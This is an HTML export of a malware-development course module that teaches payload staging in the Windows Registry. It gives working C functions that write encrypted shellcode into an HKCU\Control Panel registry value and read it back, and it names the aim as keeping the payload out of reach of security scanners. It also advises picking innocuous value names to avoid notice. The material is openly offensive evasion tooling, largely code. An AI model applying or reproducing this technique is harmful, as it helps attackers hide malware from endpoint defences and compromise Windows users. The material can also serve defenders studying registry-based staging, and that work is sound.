<html><head><meta http-equiv="Content-Type" content="text/html; charset=utf-8"/><title>31. Payload Staging - Windows Registry</title><style>
/* cspell:disable-file */
/* webkit printing magic: print all background colors */
html {
	-webkit-print-color-adjust: exact;
}
* {
	box-sizing: border-box;
	-webkit-print-color-adjust: exact;
}

html,
body {
	margin: 0;
	padding: 0;
}
@media only screen {
	body {
		margin: 2em auto;
		max-width: 900px;
		color: rgb(55, 53, 47);
	}
}

body {
	line-height: 1.5;
	white-space: pre-wrap;
}

a,
a.visited {
	color: inherit;
	text-decoration: underline;
}

.pdf-relative-link-path {
	font-size: 80%;
	color: #444;
}

h1,
h2,
h3 {
	letter-spacing: -0.01em;
	line-height: 1.2;
	font-weight: 600;
	margin-bottom: 0;
}

.page-title {
	font-size: 2.5rem;
	font-weight: 700;
	margin-top: 0;
	margin-bottom: 0.75em;
}

h1 {
	font-size: 1.875rem;
	margin-top: 1.875rem;
}

h2 {
	font-size: 1.5rem;
	margin-top: 1.5rem;
}

h3 {
	font-size: 1.25rem;
	margin-top: 1.25rem;
}

.source {
	border: 1px solid #ddd;
	border-radius: 3px;
	padding: 1.5em;
	word-break: break-all;
}

.callout {
	border-radius: 3px;
	padding: 1rem;
}

figure {
	margin: 1.25em 0;
	page-break-inside: avoid;
}

figcaption {
	opacity: 0.5;
	font-size: 85%;
	margin-top: 0.5em;
}

mark {
	background-color: transparent;
}

.indented {
	padding-left: 1.5em;
}

hr {
	background: transparent;
	display: block;
	width: 100%;
	height: 1px;
	visibility: visible;
	border: none;
	border-bottom: 1px solid rgba(55, 53, 47, 0.09);
}

img {
	max-width: 100%;
}

@media only print {
	img {
		max-height: 100vh;
		object-fit: contain;
	}
}

@page {
	margin: 1in;
}

.collection-content {
	font-size: 0.875rem;
}

.column-list {
	display: flex;
	justify-content: space-between;
}

.column {
	padding: 0 1em;
}

.column:first-child {
	padding-left: 0;
}

.column:last-child {
	padding-right: 0;
}

.table_of_contents-item {
	display: block;
	font-size: 0.875rem;
	line-height: 1.3;
	padding: 0.125rem;
}

.table_of_contents-indent-1 {
	margin-left: 1.5rem;
}

.table_of_contents-indent-2 {
	margin-left: 3rem;
}

.table_of_contents-indent-3 {
	margin-left: 4.5rem;
}

.table_of_contents-link {
	text-decoration: none;
	opacity: 0.7;
	border-bottom: 1px solid rgba(55, 53, 47, 0.18);
}

table,
th,
td {
	border: 1px solid rgba(55, 53, 47, 0.09);
	border-collapse: collapse;
}

table {
	border-left: none;
	border-right: none;
}

th,
td {
	font-weight: normal;
	padding: 0.25em 0.5em;
	line-height: 1.5;
	min-height: 1.5em;
	text-align: left;
}

th {
	color: rgba(55, 53, 47, 0.6);
}

ol,
ul {
	margin: 0;
	margin-block-start: 0.6em;
	margin-block-end: 0.6em;
}

li > ol:first-child,
li > ul:first-child {
	margin-block-start: 0.6em;
}

ul > li {
	list-style: disc;
}

ul.to-do-list {
	padding-inline-start: 0;
}

ul.to-do-list > li {
	list-style: none;
}

.to-do-children-checked {
	text-decoration: line-through;
	opacity: 0.375;
}

ul.toggle > li {
	list-style: none;
}

ul {
	padding-inline-start: 1.7em;
}

ul > li {
	padding-left: 0.1em;
}

ol {
	padding-inline-start: 1.6em;
}

ol > li {
	padding-left: 0.2em;
}

.mono ol {
	padding-inline-start: 2em;
}

.mono ol > li {
	text-indent: -0.4em;
}

.toggle {
	padding-inline-start: 0em;
	list-style-type: none;
}

/* Indent toggle children */
.toggle > li > details {
	padding-left: 1.7em;
}

.toggle > li > details > summary {
	margin-left: -1.1em;
}

.selected-value {
	display: inline-block;
	padding: 0 0.5em;
	background: rgba(206, 205, 202, 0.5);
	border-radius: 3px;
	margin-right: 0.5em;
	margin-top: 0.3em;
	margin-bottom: 0.3em;
	white-space: nowrap;
}

.collection-title {
	display: inline-block;
	margin-right: 1em;
}

.simple-table {
	margin-top: 1em;
	font-size: 0.875rem;
	empty-cells: show;
}
.simple-table td {
	height: 29px;
	min-width: 120px;
}

.simple-table th {
	height: 29px;
	min-width: 120px;
}

.simple-table-header-color {
	background: rgb(247, 246, 243);
	color: black;
}
.simple-table-header {
	font-weight: 500;
}

time {
	opacity: 0.5;
}

.icon {
	display: inline-block;
	max-width: 1.2em;
	max-height: 1.2em;
	text-decoration: none;
	vertical-align: text-bottom;
	margin-right: 0.5em;
}

img.icon {
	border-radius: 3px;
}

.user-icon {
	width: 1.5em;
	height: 1.5em;
	border-radius: 100%;
	margin-right: 0.5rem;
}

.user-icon-inner {
	font-size: 0.8em;
}

.text-icon {
	border: 1px solid #000;
	text-align: center;
}

.page-cover-image {
	display: block;
	object-fit: cover;
	width: 100%;
	max-height: 30vh;
}

.page-header-icon {
	font-size: 3rem;
	margin-bottom: 1rem;
}

.page-header-icon-with-cover {
	margin-top: -0.72em;
	margin-left: 0.07em;
}

.page-header-icon img {
	border-radius: 3px;
}

.link-to-page {
	margin: 1em 0;
	padding: 0;
	border: none;
	font-weight: 500;
}

p > .user {
	opacity: 0.5;
}

td > .user,
td > time {
	white-space: nowrap;
}

input[type="checkbox"] {
	transform: scale(1.5);
	margin-right: 0.6em;
	vertical-align: middle;
}

p {
	margin-top: 0.5em;
	margin-bottom: 0.5em;
}

.image {
	border: none;
	margin: 1.5em 0;
	padding: 0;
	border-radius: 0;
	text-align: center;
}

.code,
code {
	background: rgba(135, 131, 120, 0.15);
	border-radius: 3px;
	padding: 0.2em 0.4em;
	border-radius: 3px;
	font-size: 85%;
	tab-size: 2;
}

code {
	color: #eb5757;
}

.code {
	padding: 1.5em 1em;
}

.code-wrap {
	white-space: pre-wrap;
	word-break: break-all;
}

.code > code {
	background: none;
	padding: 0;
	font-size: 100%;
	color: inherit;
}

blockquote {
	font-size: 1.25em;
	margin: 1em 0;
	padding-left: 1em;
	border-left: 3px solid rgb(55, 53, 47);
}

.bookmark {
	text-decoration: none;
	max-height: 8em;
	padding: 0;
	display: flex;
	width: 100%;
	align-items: stretch;
}

.bookmark-title {
	font-size: 0.85em;
	overflow: hidden;
	text-overflow: ellipsis;
	height: 1.75em;
	white-space: nowrap;
}

.bookmark-text {
	display: flex;
	flex-direction: column;
}

.bookmark-info {
	flex: 4 1 180px;
	padding: 12px 14px 14px;
	display: flex;
	flex-direction: column;
	justify-content: space-between;
}

.bookmark-image {
	width: 33%;
	flex: 1 1 180px;
	display: block;
	position: relative;
	object-fit: cover;
	border-radius: 1px;
}

.bookmark-description {
	color: rgba(55, 53, 47, 0.6);
	font-size: 0.75em;
	overflow: hidden;
	max-height: 4.5em;
	word-break: break-word;
}

.bookmark-href {
	font-size: 0.75em;
	margin-top: 0.25em;
}

.sans { font-family: ui-sans-serif, -apple-system, BlinkMacSystemFont, "Segoe UI", Helvetica, "Apple Color Emoji", Arial, sans-serif, "Segoe UI Emoji", "Segoe UI Symbol"; }
.code { font-family: "SFMono-Regular", Menlo, Consolas, "PT Mono", "Liberation Mono", Courier, monospace; }
.serif { font-family: Lyon-Text, Georgia, ui-serif, serif; }
.mono { font-family: iawriter-mono, Nitti, Menlo, Courier, monospace; }
.pdf .sans { font-family: Inter, ui-sans-serif, -apple-system, BlinkMacSystemFont, "Segoe UI", Helvetica, "Apple Color Emoji", Arial, sans-serif, "Segoe UI Emoji", "Segoe UI Symbol", 'Twemoji', 'Noto Color Emoji', 'Noto Sans CJK JP'; }
.pdf:lang(zh-CN) .sans { font-family: Inter, ui-sans-serif, -apple-system, BlinkMacSystemFont, "Segoe UI", Helvetica, "Apple Color Emoji", Arial, sans-serif, "Segoe UI Emoji", "Segoe UI Symbol", 'Twemoji', 'Noto Color Emoji', 'Noto Sans CJK SC'; }
.pdf:lang(zh-TW) .sans { font-family: Inter, ui-sans-serif, -apple-system, BlinkMacSystemFont, "Segoe UI", Helvetica, "Apple Color Emoji", Arial, sans-serif, "Segoe UI Emoji", "Segoe UI Symbol", 'Twemoji', 'Noto Color Emoji', 'Noto Sans CJK TC'; }
.pdf:lang(ko-KR) .sans { font-family: Inter, ui-sans-serif, -apple-system, BlinkMacSystemFont, "Segoe UI", Helvetica, "Apple Color Emoji", Arial, sans-serif, "Segoe UI Emoji", "Segoe UI Symbol", 'Twemoji', 'Noto Color Emoji', 'Noto Sans CJK KR'; }
.pdf .code { font-family: Source Code Pro, "SFMono-Regular", Menlo, Consolas, "PT Mono", "Liberation Mono", Courier, monospace, 'Twemoji', 'Noto Color Emoji', 'Noto Sans Mono CJK JP'; }
.pdf:lang(zh-CN) .code { font-family: Source Code Pro, "SFMono-Regular", Menlo, Consolas, "PT Mono", "Liberation Mono", Courier, monospace, 'Twemoji', 'Noto Color Emoji', 'Noto Sans Mono CJK SC'; }
.pdf:lang(zh-TW) .code { font-family: Source Code Pro, "SFMono-Regular", Menlo, Consolas, "PT Mono", "Liberation Mono", Courier, monospace, 'Twemoji', 'Noto Color Emoji', 'Noto Sans Mono CJK TC'; }
.pdf:lang(ko-KR) .code { font-family: Source Code Pro, "SFMono-Regular", Menlo, Consolas, "PT Mono", "Liberation Mono", Courier, monospace, 'Twemoji', 'Noto Color Emoji', 'Noto Sans Mono CJK KR'; }
.pdf .serif { font-family: PT Serif, Lyon-Text, Georgia, ui-serif, serif, 'Twemoji', 'Noto Color Emoji', 'Noto Serif CJK JP'; }
.pdf:lang(zh-CN) .serif { font-family: PT Serif, Lyon-Text, Georgia, ui-serif, serif, 'Twemoji', 'Noto Color Emoji', 'Noto Serif CJK SC'; }
.pdf:lang(zh-TW) .serif { font-family: PT Serif, Lyon-Text, Georgia, ui-serif, serif, 'Twemoji', 'Noto Color Emoji', 'Noto Serif CJK TC'; }
.pdf:lang(ko-KR) .serif { font-family: PT Serif, Lyon-Text, Georgia, ui-serif, serif, 'Twemoji', 'Noto Color Emoji', 'Noto Serif CJK KR'; }
.pdf .mono { font-family: PT Mono, iawriter-mono, Nitti, Menlo, Courier, monospace, 'Twemoji', 'Noto Color Emoji', 'Noto Sans Mono CJK JP'; }
.pdf:lang(zh-CN) .mono { font-family: PT Mono, iawriter-mono, Nitti, Menlo, Courier, monospace, 'Twemoji', 'Noto Color Emoji', 'Noto Sans Mono CJK SC'; }
.pdf:lang(zh-TW) .mono { font-family: PT Mono, iawriter-mono, Nitti, Menlo, Courier, monospace, 'Twemoji', 'Noto Color Emoji', 'Noto Sans Mono CJK TC'; }
.pdf:lang(ko-KR) .mono { font-family: PT Mono, iawriter-mono, Nitti, Menlo, Courier, monospace, 'Twemoji', 'Noto Color Emoji', 'Noto Sans Mono CJK KR'; }
.highlight-default {
	color: rgba(55, 53, 47, 1);
}
.highlight-gray {
	color: rgba(120, 119, 116, 1);
	fill: rgba(120, 119, 116, 1);
}
.highlight-brown {
	color: rgba(159, 107, 83, 1);
	fill: rgba(159, 107, 83, 1);
}
.highlight-orange {
	color: rgba(217, 115, 13, 1);
	fill: rgba(217, 115, 13, 1);
}
.highlight-yellow {
	color: rgba(203, 145, 47, 1);
	fill: rgba(203, 145, 47, 1);
}
.highlight-teal {
	color: rgba(68, 131, 97, 1);
	fill: rgba(68, 131, 97, 1);
}
.highlight-blue {
	color: rgba(51, 126, 169, 1);
	fill: rgba(51, 126, 169, 1);
}
.highlight-purple {
	color: rgba(144, 101, 176, 1);
	fill: rgba(144, 101, 176, 1);
}
.highlight-pink {
	color: rgba(193, 76, 138, 1);
	fill: rgba(193, 76, 138, 1);
}
.highlight-red {
	color: rgba(212, 76, 71, 1);
	fill: rgba(212, 76, 71, 1);
}
.highlight-gray_background {
	background: rgba(241, 241, 239, 1);
}
.highlight-brown_background {
	background: rgba(244, 238, 238, 1);
}
.highlight-orange_background {
	background: rgba(251, 236, 221, 1);
}
.highlight-yellow_background {
	background: rgba(251, 243, 219, 1);
}
.highlight-teal_background {
	background: rgba(237, 243, 236, 1);
}
.highlight-blue_background {
	background: rgba(231, 243, 248, 1);
}
.highlight-purple_background {
	background: rgba(244, 240, 247, 0.8);
}
.highlight-pink_background {
	background: rgba(249, 238, 243, 0.8);
}
.highlight-red_background {
	background: rgba(253, 235, 236, 1);
}
.block-color-default {
	color: inherit;
	fill: inherit;
}
.block-color-gray {
	color: rgba(120, 119, 116, 1);
	fill: rgba(120, 119, 116, 1);
}
.block-color-brown {
	color: rgba(159, 107, 83, 1);
	fill: rgba(159, 107, 83, 1);
}
.block-color-orange {
	color: rgba(217, 115, 13, 1);
	fill: rgba(217, 115, 13, 1);
}
.block-color-yellow {
	color: rgba(203, 145, 47, 1);
	fill: rgba(203, 145, 47, 1);
}
.block-color-teal {
	color: rgba(68, 131, 97, 1);
	fill: rgba(68, 131, 97, 1);
}
.block-color-blue {
	color: rgba(51, 126, 169, 1);
	fill: rgba(51, 126, 169, 1);
}
.block-color-purple {
	color: rgba(144, 101, 176, 1);
	fill: rgba(144, 101, 176, 1);
}
.block-color-pink {
	color: rgba(193, 76, 138, 1);
	fill: rgba(193, 76, 138, 1);
}
.block-color-red {
	color: rgba(212, 76, 71, 1);
	fill: rgba(212, 76, 71, 1);
}
.block-color-gray_background {
	background: rgba(241, 241, 239, 1);
}
.block-color-brown_background {
	background: rgba(244, 238, 238, 1);
}
.block-color-orange_background {
	background: rgba(251, 236, 221, 1);
}
.block-color-yellow_background {
	background: rgba(251, 243, 219, 1);
}
.block-color-teal_background {
	background: rgba(237, 243, 236, 1);
}
.block-color-blue_background {
	background: rgba(231, 243, 248, 1);
}
.block-color-purple_background {
	background: rgba(244, 240, 247, 0.8);
}
.block-color-pink_background {
	background: rgba(249, 238, 243, 0.8);
}
.block-color-red_background {
	background: rgba(253, 235, 236, 1);
}
.select-value-color-pink { background-color: rgba(245, 224, 233, 1); }
.select-value-color-purple { background-color: rgba(232, 222, 238, 1); }
.select-value-color-green { background-color: rgba(219, 237, 219, 1); }
.select-value-color-gray { background-color: rgba(227, 226, 224, 1); }
.select-value-color-translucentGray { background-color: rgba(255, 255, 255, 0.0375); }
.select-value-color-orange { background-color: rgba(250, 222, 201, 1); }
.select-value-color-brown { background-color: rgba(238, 224, 218, 1); }
.select-value-color-red { background-color: rgba(255, 226, 221, 1); }
.select-value-color-yellow { background-color: rgba(253, 236, 200, 1); }
.select-value-color-blue { background-color: rgba(211, 229, 239, 1); }

.checkbox {
	display: inline-flex;
	vertical-align: text-bottom;
	width: 16;
	height: 16;
	background-size: 16px;
	margin-left: 2px;
	margin-right: 5px;
}

.checkbox-on {
	background-image: url("data:image/svg+xml;charset=UTF-8,%3Csvg%20width%3D%2216%22%20height%3D%2216%22%20viewBox%3D%220%200%2016%2016%22%20fill%3D%22none%22%20xmlns%3D%22http%3A%2F%2Fwww.w3.org%2F2000%2Fsvg%22%3E%0A%3Crect%20width%3D%2216%22%20height%3D%2216%22%20fill%3D%22%2358A9D7%22%2F%3E%0A%3Cpath%20d%3D%22M6.71429%2012.2852L14%204.9995L12.7143%203.71436L6.71429%209.71378L3.28571%206.2831L2%207.57092L6.71429%2012.2852Z%22%20fill%3D%22white%22%2F%3E%0A%3C%2Fsvg%3E");
}

.checkbox-off {
	background-image: url("data:image/svg+xml;charset=UTF-8,%3Csvg%20width%3D%2216%22%20height%3D%2216%22%20viewBox%3D%220%200%2016%2016%22%20fill%3D%22none%22%20xmlns%3D%22http%3A%2F%2Fwww.w3.org%2F2000%2Fsvg%22%3E%0A%3Crect%20x%3D%220.75%22%20y%3D%220.75%22%20width%3D%2214.5%22%20height%3D%2214.5%22%20fill%3D%22white%22%20stroke%3D%22%2336352F%22%20stroke-width%3D%221.5%22%2F%3E%0A%3C%2Fsvg%3E");
}
	
</style></head><body><article id="e777de60-5e88-4adf-970e-64206c5d249f" class="page sans"><header><h1 class="page-title"><a href="https://maldevacademy.com/modules/31"><strong>31. Payload Staging - Windows Registry</strong></a></h1></header><div class="page-body"><h2 id="fa3e0694-b9ed-4133-afca-c6b413f9b06a" class=""><strong>Payload Staging - Windows Registry</strong></h2><h3 id="fae47817-1c2b-440b-ae82-2843f3b9c72a" class=""><strong>Introduction</strong></h3><p id="4379dbe8-5849-458e-8e14-c94a41ee660c" class="">The previous module showed that a payload does not necessarily need to be stored inside the malware. Instead, the payload can be fetched at runtime by the malware. This module will show a similar technique, except the payload will be written as a registry key value and then fetched from the Registry when required. Since the payload will be stored in the Registry, if security solutions scan the malware they will be unable to detect or find any payload within.</p><p id="6080a989-dae9-409c-af47-17aed5928874" class="">This code in this module is divided into two parts. The first part is writing the encrypted payload to a registry key. The second part reads the payload from the same registry key, decrypts it and executes it. The module will not explain the encryption/decryption process as this was explained in prior modules.</p><p id="047ca213-4612-46a6-968f-3f5dee2f4808" class="">This module will also introduce the concept of <a href="https://www.techonthenet.com/c_language/directives/ifdef.php">Conditional Compilation</a>.</p><h3 id="fa266286-8bcd-4964-b1a9-ef66e73e3d4f" class=""><strong>Conditional Compilation</strong></h3><p id="18230d04-de8e-4bb9-aec5-fe429ef9ab20" class="">Conditional compilation is a way to include code inside a project which the compiler will either compile or not compile. This will be used by the implementation to decide whether it&#x27;s reading or writing to the Registry.</p><p id="10287c75-08e8-43e0-bbb9-fa714c391444" class="">The two sections below provide skeleton code as to how the read and write operations will be written using conditional compilation.</p><h3 id="02b5e8b4-c135-4a02-b47e-b74c8b2616ff" class=""><strong>Write Operation</strong></h3><pre id="978111d1-c62f-4e26-9a8c-9922ec705d51" class="code code-wrap"><code>	#define WRITEMODE// Code that will be compiled in both cases

	// if &#x27;WRITEMODE&#x27; is defined
	#ifdef WRITEMODE// The code that will be compiled
		// Code that&#x27;s needed to write the payload to the Registry
	#endif// if &#x27;READMODE&#x27; is defined
	#ifdef READMODE// Code that will NOT be compiled
	#endif</code></pre><h3 id="6a52aba9-6ed6-4642-af6e-9be2129d0889" class=""><strong>Read Operation</strong></h3><pre id="231efcff-b0d2-411e-b014-04c6551841c3" class="code code-wrap"><code>	#define READMODE// Code that will be compiled in both cases

	// if &#x27;READMODE&#x27; is defined
	#ifdef READMODE// The code that will be compiled
		// Code that&#x27;s needed to read the payload from the Registry
	#endif

	// if &#x27;WRITEMODE&#x27; is defined
	#ifdef WRITEMODE// Code that will NOT be compiled
	#endif

</code></pre><h3 id="062fe83f-bc68-45fc-a207-fbe1138c950f" class=""><strong>Writing To The Registry</strong></h3><p id="0d328171-5aa7-464e-b76e-60259bc5594b" class="">This section will walk through the <code>WriteShellcodeToRegistry</code> function. The function takes two parameters:</p><ol type="1" id="9ba880be-c858-4bfe-9229-c6f33c2461c1" class="numbered-list" start="1"><li><code>pShellcode</code> - The payload to be written.</li></ol><ol type="1" id="91992fce-f887-4b97-9e6a-6bad88ee7091" class="numbered-list" start="2"><li><code>dwShellcodeSize</code> - The size of the payload to be written.</li></ol><h3 id="d78f7ba5-d521-4140-b5e3-f4b5b3b995cd" class=""><strong>REGISTRY &amp; REGSTRING</strong></h3><p id="79d3280f-84ce-472a-901b-1b470833dda0" class="">The code starts with two pre-defined constants <code>REGISTRY</code> and <code>REGSTRING</code> which are set to <code>Control Panel</code> and <code>MalDevAcademy</code> respectively.</p><pre id="10c254aa-5610-470c-84e2-c8d26ff29c3f" class="code code-wrap"><code>// Registry key to read / write
#define     REGISTRY            &quot;Control Panel&quot;#define     REGSTRING           &quot;MalDevAcademy&quot;</code></pre><p id="0b2e2400-a106-42a9-a2a2-b4e9b182b251" class=""><code>REGISTRY</code> is the name of the registry key that will hold the payload. The full path of <code>REGISTRY</code> will be <code>Computer\HKEY_CURRENT_USER\Control Panel</code>.</p><p id="4458c108-41fc-4b53-95cd-6bb44be7a7b1" class="">
</p><figure id="9920b612-f739-4824-a256-eb2b015a603c" class="image"><a href="31%20Payload%20Staging%20-%20Windows%20Registry%20e777de605e884adf970e64206c5d249f/registry-img.png"><img style="width:1166px" src="31%20Payload%20Staging%20-%20Windows%20Registry%20e777de605e884adf970e64206c5d249f/registry-img.png"/></a></figure><p id="f5ef14a8-8909-4ba1-994f-9e503abbfe04" class="">What the function will be doing programmatically is creating a new <code>String Value</code> under this registry key to store the payload. <code>REGSTRING</code> is the name of the string value that will be created. Obviously, in a real situation, use a more realistic value such as <code>PanelUpdateService</code> or <code>AppSnapshot</code>.</p><figure id="45652b9d-f3bb-4d0b-bca2-20d6324edbe7" class="image"><a href="31%20Payload%20Staging%20-%20Windows%20Registry%20e777de605e884adf970e64206c5d249f/registry-new-string-value.png"><img style="width:547px" src="31%20Payload%20Staging%20-%20Windows%20Registry%20e777de605e884adf970e64206c5d249f/registry-new-string-value.png"/></a></figure><h3 id="b8238b05-7a9d-47cb-8219-024fb89cbfc2" class=""><strong>Opening a Handle To The Registry Key</strong></h3><p id="027643c9-4571-4b93-9001-4ad1ba4c1d2a" class="">The <a href="https://learn.microsoft.com/en-us/windows/win32/api/winreg/nf-winreg-regopenkeyexa">RegOpenKeyExA</a> WinAPI is used to open a handle to the specified registry key which is a prerequisite to creating, editing or deleting values under the registry key.</p><pre id="a5ba2b42-0c94-4494-ac4b-1d548b7beae7" class="code code-wrap"><code>LSTATUS RegOpenKeyExA(
  [in]           HKEY   hKey, 		// A handle to an open registry key
  [in, optional] LPCSTR lpSubKey, 	// The name of the registry subkey to be opened (REGISTRY constant)
  [in]           DWORD  ulOptions, 	// Specifies the option to apply when opening the key - Set to 0
  [in]           REGSAM samDesired, 	// Access Rights
  [out]          PHKEY  phkResult 	// A pointer to a variable that receives a handle to the opened key
);
</code></pre><p id="5d75c71e-a8cc-454f-b6a3-ac12e11db3e6" class="">The fourth parameter of the <code>RegOpenKeyExA</code> WinAPI defines the access rights to the registry key. Because the program needs to create a value under the registry key, <code>KEY_SET_VALUE</code> was selected. The full list of registry access rights can be found <a href="https://learn.microsoft.com/en-us/windows/win32/sysinfo/registry-key-security-and-access-rights">here</a>.</p><pre id="0e309263-76f5-4b5b-bdf6-e1f242cc04e7" class="code code-wrap"><code>STATUS = RegOpenKeyExA(HKEY_CURRENT_USER, REGISTRY, 0, KEY_SET_VALUE, &amp;hKey);
</code></pre><h3 id="fb68c17f-87bb-403f-bc49-5436352b58d8" class=""><strong>Setting Registry Value</strong></h3><p id="f41ff916-bb70-4694-a057-0e1c41b22113" class="">Next, the <a href="https://learn.microsoft.com/en-us/windows/win32/api/winreg/nf-winreg-regsetvalueexa">RegSetValueExA</a> WinAPI is used which takes the opened handle from <code>RegOpenKeyExA</code> and creates a new value that is based on the second parameter, <code>REGSTRING</code>. It will also write the payload to the newly created value.</p><pre id="a4e653b3-61f6-4e89-8a9e-9f387b53b1e6" class="code code-wrap"><code>LSTATUS RegSetValueExA(
  [in]           HKEY       hKey,            // A handle to an open registry key
  [in, optional] LPCSTR     lpValueName,     // The name of the value to be set (REGSTRING constant)
                 DWORD      Reserved,        // Set to 0
  [in]           DWORD      dwType,          // The type of data pointed to by the lpData parameter
  [in]           const BYTE *lpData,         // The data to be stored
  [in]           DWORD      cbData           // The size of the information pointed to by the lpData parameter, in bytes
);
</code></pre><p id="330a221d-ae52-4d6f-997c-d7a66cfbaf27" class="">It is also worth noting that the fourth parameter specifies the data type for the registry value. In this case, it&#x27;s set to <code>REG_BINARY</code> since the payload is simply a list of bytes but the complete list of data types can be found <a href="https://learn.microsoft.com/en-us/windows/win32/sysinfo/registry-value-types">here</a>.</p><pre id="f86874d1-a4fd-49e4-8fa6-07d8693a19db" class="code code-wrap"><code>STATUS = RegSetValueExA(hKey, REGSTRING, 0, REG_BINARY, pShellcode, dwShellcodeSize);
</code></pre><h3 id="d89315b4-8b4e-48cb-a1c9-049c62202c41" class=""><strong>Closing Registry Key Handle</strong></h3><p id="38e48548-4dbf-4103-8b74-040aa4657f81" class="">Finally, <a href="https://learn.microsoft.com/en-us/windows/win32/api/winreg/nf-winreg-regclosekey">RegCloseKey</a> is used to close the handle of the registry key that was opened.</p><pre id="780612dc-19c5-449e-8a6d-c8b1416415c4" class="code code-wrap"><code>LSTATUS RegCloseKey(
  [in] HKEY hKey // Handle to an open registry key to be closed
);
</code></pre><h3 id="0a28a38d-14ef-4a82-93d7-bed412e854da" class=""><strong>Writing To The Registry - Code Snippet</strong></h3><pre id="2a0b090f-e867-45bd-b879-7c977cf2f499" class="code code-wrap"><code>// Registry key to read / write
#define     REGISTRY            &quot;Control Panel&quot;#define     REGSTRING           &quot;MalDevAcademy&quot;

BOOL WriteShellcodeToRegistry(IN PBYTE pShellcode, IN DWORD dwShellcodeSize) {

    BOOL        bSTATE  = TRUE;
    LSTATUS     STATUS  = NULL;
    HKEY        hKey    = NULL;

    printf(&quot;[i] Writing 0x%p [ Size: %ld ] to \&quot;%s\\%s\&quot; ... &quot;, pShellcode, dwShellcodeSize, REGISTRY, REGSTRING);

    STATUS = RegOpenKeyExA(HKEY_CURRENT_USER, REGISTRY, 0, KEY_SET_VALUE, &amp;hKey);
    if (ERROR_SUCCESS != STATUS) {
        printf(&quot;[!] RegOpenKeyExA Failed With Error : %d\n&quot;, STATUS);
        bSTATE = FALSE; goto _EndOfFunction;
    }

    STATUS = RegSetValueExA(hKey, REGSTRING, 0, REG_BINARY, pShellcode, dwShellcodeSize);
    if (ERROR_SUCCESS != STATUS){
        printf(&quot;[!] RegSetValueExA Failed With Error : %d\n&quot;, STATUS);
        bSTATE = FALSE; goto _EndOfFunction;
    }

    printf(&quot;[+] DONE ! \n&quot;);


_EndOfFunction:
    if (hKey)
        RegCloseKey(hKey);
    return bSTATE;
}

</code></pre><h3 id="b138e08c-89b3-42bd-8047-c7f754c664ac" class=""><strong>Reading The Registry</strong></h3><p id="36a92302-72bf-42fc-975b-f86fb01366e1" class="">Now that the payload has been written to the <code>MalDevAcademy</code> string under the <code>Computer\HKEY_CURRENT_USER\Control Panel</code> registry key, it is time to write the other implementation which will contain the decryption functionality that <code>HellShell.exe</code> provided.</p><p id="4686ad00-2e9f-4ea5-8cd7-4228c32d911b" class="">This section will walk through the <code>ReadShellcodeFromRegistry</code> function (shown below). The function takes two parameters:</p><ol type="1" id="a8dbabf8-da82-4ea3-8884-699f7acb7f71" class="numbered-list" start="1"><li><code>sPayloadSize</code> - The payload size to read.</li></ol><ol type="1" id="3aa906d0-b37c-4980-a0ca-123999f9a4d4" class="numbered-list" start="2"><li><code>ppPayload</code> - A buffer that will store the outputted payload.</li></ol><h3 id="f6a35ce8-0287-4787-9ed5-24bc159281db" class=""><strong>Heap Allocation</strong></h3><p id="d2f2a474-cc08-4668-a316-050a633e36dd" class="">The function starts by allocating memory to the size of <code>sPayloadSize</code> which will store the payload.</p><pre id="04af80de-054a-402a-b83d-a84931e6309c" class="code code-wrap"><code>pBytes = HeapAlloc(GetProcessHeap(), HEAP_ZERO_MEMORY, sPayloadSize);
</code></pre><h3 id="8926b278-c0dc-4974-888a-a27dcc86dcc3" class=""><strong>Read Registry Value</strong></h3><p id="dabd4fde-ff5e-4828-a259-52d3c9f9d998" class="">The <a href="https://learn.microsoft.com/en-us/windows/win32/api/winreg/nf-winreg-reggetvaluea">RegGetValueA</a> function requires the registry key and value to read, which are <code>REGISTRY</code> and <code>REGSTRING</code>, respectively. In the previous module, it was possible to fetch the payload from the internet in several chunks of any size, however, when working with <code>RegGetValueA</code> this is not possible since it does not read the bytes as a stream of data but rather all at once. All of this means that knowing the payload size is a requirement in the reading implementation.</p><pre id="d167d27b-2507-477e-bbf2-3c10a564d1a2" class="code code-wrap"><code>LSTATUS RegGetValueA(
  [in]                HKEY    hkey,     // A handle to an open registry key
  [in, optional]      LPCSTR  lpSubKey, // The path of a registry key relative to the key specified by the hkey parameter
  [in, optional]      LPCSTR  lpValue,  // The name of the registry value.
  [in, optional]      DWORD   dwFlags,  // The flags that restrict the data type of value to be queried
  [out, optional]     LPDWORD pdwType,  // A pointer to a variable that receives a code indicating the type of data stored in the specified value
  [out, optional]     PVOID   pvData,   // A pointer to a buffer that receives the value&#x27;s data
  [in, out, optional] LPDWORD pcbData   // A pointer to a variable that specifies the size of the buffer pointed to by the pvData parameter, in bytes
);
</code></pre><p id="6d9bdd41-3fd2-42a8-bb9d-0a32f64ff5cb" class="">The fourth parameter can be used to restrict the data type, however, this implementation uses <code>RRF_RT_ANY</code>, signifying any data type. Alternatively, <code>RRF_RT_REG_BINARY</code> could have been used since the payload is of binary data type. Lastly, the payload is read to <code>pBytes</code> which was previously allocated using <code>HeapAlloc</code>.</p><pre id="8fe6977b-8861-44da-9106-b3180776eece" class="code code-wrap"><code>STATUS = RegGetValueA(HKEY_CURRENT_USER, REGISTRY, REGSTRING, RRF_RT_ANY, NULL, pBytes, &amp;dwBytesRead);
</code></pre><h3 id="7843ac22-52bd-421a-a41f-9eb8b17fcc26" class=""><strong>Reading Registry - Code Snippet</strong></h3><pre id="191618a9-5c28-4aaf-ad2f-9807c20c563e" class="code code-wrap"><code>BOOL ReadShellcodeFromRegistry(IN DWORD sPayloadSize, OUT PBYTE* ppPayload) {

    LSTATUS     STATUS            = NULL;
    DWORD       dwBytesRead       = sPayloadSize;
    PVOID       pBytes            = NULL;


    pBytes = HeapAlloc(GetProcessHeap(), HEAP_ZERO_MEMORY, sPayloadSize);
    if (pBytes == NULL){
        printf(&quot;[!] HeapAlloc Failed With Error : %d\n&quot;, GetLastError());
        return FALSE;
    }

    STATUS = RegGetValueA(HKEY_CURRENT_USER, REGISTRY, REGSTRING, RRF_RT_ANY, NULL, pBytes, &amp;dwBytesRead);
    if (ERROR_SUCCESS != STATUS) {
        printf(&quot;[!] RegGetValueA Failed With Error : %d\n&quot;, STATUS);
        return FALSE;
    }

    if (sPayloadSize != dwBytesRead) {
        printf(&quot;[!] Total Bytes Read : %d ; Instead Of Reading : %d\n&quot;, dwBytesRead, sPayloadSize);
        return FALSE;
    }

    *ppPayload = pBytes;

    return TRUE;
}

